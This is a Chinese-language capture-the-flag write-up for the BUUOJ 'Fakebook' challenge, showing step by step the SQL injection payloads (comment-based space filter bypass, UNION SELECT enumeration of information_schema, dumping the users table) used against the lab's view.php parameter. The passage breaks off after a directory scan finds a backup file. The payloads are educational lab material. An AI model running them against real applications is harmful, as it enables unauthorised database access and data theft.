## 0x01 Fakebook

本题考点为SQL注入和SSRF，首先随意注册一个账户，进行登录后发现网址为

```
http://125afc2e-8d0c-4333-9d75-14d7fa2d63f1.node3.buuoj.cn/view.php?no=1
```

推断no=1为可注入点

进行注入后发现屏蔽空格，将空格换为`/**/`进行绕过屏蔽字，构造payload完成SQL注入获取内部的信息

Payload：

```
no=1 order by 4#  //发现order by 5时出现报错，推断有四列
no=0/**/union/**/select 1,2,3,4#  //通过报错页面得知2有回显
no=0/**/union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()#
                //爆表名发现有一个users表
no=0/**/union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'#
                //爆字段名发现username、passwd和data，username和passwd没有发现flag，data中发现一个反序列化对象
no=0/**/union/**/select 1,group_concat(data),3,4 from users#  //爆出data的值
```

发现data值为

```
O:8:"UserInfo":3:{s:4:"name";s:3:"123";s:3:"age";i:1;s:4:"blog";s:9:"1.1.1.com";}
```

同时使用dirsearch扫描目录发现`user.php.bak`





